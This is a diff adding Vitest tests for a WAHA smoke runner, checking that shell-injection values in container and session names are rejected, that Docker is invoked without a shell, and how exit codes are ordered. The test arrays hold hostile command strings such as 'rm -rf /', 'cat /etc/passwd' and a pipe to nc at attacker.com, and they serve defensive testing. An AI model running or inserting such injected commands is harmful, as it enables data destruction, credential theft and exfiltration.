@@ -253,4 +253,196 @@ describe("WAHA Smoke Runner Truthfulness & Robustness (CH-10)", () => {
     });
     expect(stopOrRmCalls).toHaveLength(0);
   });
+
+  describe("Command Injection Prevention & Strict Shell Safety (P0-1)", () => {
+    it("should reject containerName containing shell injection characters ($(), backticks, quotes, semicolon)", () => {
+      const maliciousNames = [
+        "waha; rm -rf /",
+        "waha$(whoami)",
+        "waha`id`",
+        'waha" && echo pwned',
+        "waha' || reboot",
+        "waha | nc attacker.com 4444",
+        "waha\nmalicious",
+      ];
+
+      for (const name of maliciousNames) {
+        expect(() => {
+          new WahaSmokeRunner({ containerName: name });
+        }).toThrow(/Security validation error/);
+      }
+    });
+
+    it("should reject sessionName containing shell injection characters ($(), backticks, quotes, semicolon)", () => {
+      const maliciousNames = [
+        "session; cat /etc/passwd",
+        "session$(cat secret)",
+        "session`touch /tmp/pwn`",
+        'session" && id',
+        "session' || whoami",
+        "session & ping -c 1 127.0.0.1",
+        "session>file",
+      ];
+
+      for (const name of maliciousNames) {
+        expect(() => {
+          new WahaSmokeRunner({ sessionName: name });
+        }).toThrow(/Security validation error/);
+      }
+    });
+
+    it("should pass arguments strictly as argument array to execFile without shell interpretation", async () => {
+      const recordedCalls: Array<{ file: string; args: readonly string[]; options?: any }> = [];
+      const mockExecFile = vi.fn().mockImplementation(async (file: string, args: readonly string[], options?: any) => {
+        recordedCalls.push({ file, args, options });
+        if (args.includes("config")) {
+          return { stdout: "services:\n  sos-v3-waha:\n", stderr: "" };
+        }
+        if (args.includes("info")) {
+          return { stdout: "29.8.0\n", stderr: "" };
+        }
+        return { stdout: "", stderr: "" };
+      });
+
+      const runner = new WahaSmokeRunner({
+        port: "3000",
+        containerName: "safe-container-123",
+        sessionName: "safe-session-456",
+        apiKey: "secret'with\"quotes$and;semi",
+        execFileFn: mockExecFile,
+      });
+
+      const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (url) => {
+        const u = String(url);
+        if (u.includes("/api/server/version")) {
+          return new Response(JSON.stringify({ version: "2026.8.2" }), { status: 200 });
+        }
+        if (u.includes("/api/sessions?all=true")) {
+          return new Response(JSON.stringify([{ name: "safe-session-456", status: "WORKING" }]), { status: 200 });
+        }
+        if (u.includes("/api/sessions/start")) {
+          return new Response(JSON.stringify({ name: "safe-session-456", status: "STARTING" }), { status: 201 });
+        }
+        return new Response("{}", { status: 200 });
+      });
+
+      try {
+        await runner.execute();
+
+        // Verify all invocations used pure argument arrays
+        expect(recordedCalls.length).toBeGreaterThan(0);
+        for (const call of recordedCalls) {
+          expect(call.file).toBe("docker");
+          expect(Array.isArray(call.args)).toBe(true);
+          // Ensure no shell wrapper string like `sh -c` was used
+          expect(call.args).not.toContain("sh");
+          expect(call.args).not.toContain("-c");
+        }
+
+        // Verify WAHA_API_KEY was passed exclusively via options.env, NOT in argument strings
+        const composeCalls = recordedCalls.filter((c) => c.args.includes("compose"));
+        for (const call of composeCalls) {
+          expect(call.options?.env?.WAHA_API_KEY).toBe("secret'with\"quotes$and;semi");
+          // Must NOT appear in argument strings
+          for (const arg of call.args) {
+            expect(arg).not.toContain("secret'with\"quotes$and;semi");
+          }
+        }
+      } finally {
+        fetchSpy.mockRestore();
+      }
+    });
+
+    it("should URL-encode sessionName in REST API endpoints", async () => {
+      const runner = new WahaSmokeRunner({
+        port: "3000",
+        sessionName: "test-session-encoded",
+      });
+      (runner as any).sessionCreatedByTest = true;
+
+      const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (url) => {
+        return new Response("{}", { status: 200 });
+      });
+
+      try {
+        await runner.deleteSessionViaApi();
+        expect(fetchSpy).toHaveBeenCalled();
+        const callUrl = String(fetchSpy.mock.calls[0]![0]);
+        expect(callUrl).toContain("/api/sessions/test-session-encoded");
+      } finally {
+        fetchSpy.mockRestore();
+      }
+    });
+  });
+
+  describe("Verdict Ordering & Distinct Exit Codes (P0-3)", () => {
+    it("should enforce exitCode 2 for BLOCKED_EXTERNAL when no errors occurred", () => {
+      const runner = new WahaSmokeRunner({
+        port: "3000",
+        sessionName: "blocked-test-session",
+      });
+
+      runner.results.push(
+        { step: "1. Render compose", status: "PASS", details: "ok" },
+        { step: "2. Start container", status: "BLOCKED_EXTERNAL", details: "Pre-existing container" },
+        { step: "8. Cleanup", status: "PASS", details: "Cleaned up" }
+      );
+
+      const verdict = runner.evaluateVerdict();
+      expect(verdict.success).toBe(false);
+      expect(verdict.exitCode).toBe(2);
+    });
+
+    it("should enforce exitCode 1 if FAIL occurs, even when BLOCKED_EXTERNAL is also present", () => {
+      const runner = new WahaSmokeRunner({
+        port: "3000",
+        sessionName: "mixed-status-session",
+      });
+
+      runner.results.push(
+        { step: "1. Render compose", status: "PASS", details: "ok" },
+        { step: "2. Start container", status: "BLOCKED_EXTERNAL", details: "Blocked" },
+        { step: "8. Cleanup", status: "FAIL", details: "Cleanup crashed" }
+      );
+
+      const verdict = runner.evaluateVerdict();
+      expect(verdict.success).toBe(false);
+      expect(verdict.exitCode).toBe(1);
+    });
+
+    it("should ensure cleanup failure in Step 8 causes exitCode 1 even if pipeline aborted at Step 4", async () => {
+      const mockExecFile = vi.fn().mockImplementation(async (file, args) => {
+        if (args.includes("info")) return { stdout: "29.8.0\n", stderr: "" };
+        if (args.includes("config")) return { stdout: "services:\n  sos-v3-waha:\n", stderr: "" };
+        if (args.includes("stop")) throw new Error("Stop failed");
+        return { stdout: "", stderr: "" };
+      });
+
+      const runner = new WahaSmokeRunner({
+        port: "3000",
+        sessionName: "abort-then-cleanup-fail",
+        simulateFailureAtStep: 4,
+        execFileFn: mockExecFile,
+      });
+
+      // Mock fetch
+      const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async () => {
+        return new Response(JSON.stringify({ version: "2026.8.2" }), { status: 200 });
+      });
+
+      try {
+        const result = await runner.execute();
+        // Step 4 failed AND Step 8 cleanup failed -> exitCode must be 1
+        expect(result.exitCode).toBe(1);
+        expect(result.success).toBe(false);
+
+        // Step 8 must be present in the final results!
+        const step8 = result.results.find((r) => r.step.startsWith("8."));
+        expect(step8).toBeDefined();
+        expect(step8?.status).toBe("FAIL");
+      } finally {
+        fetchSpy.mockRestore();
+      }
+    });
+  });
 });
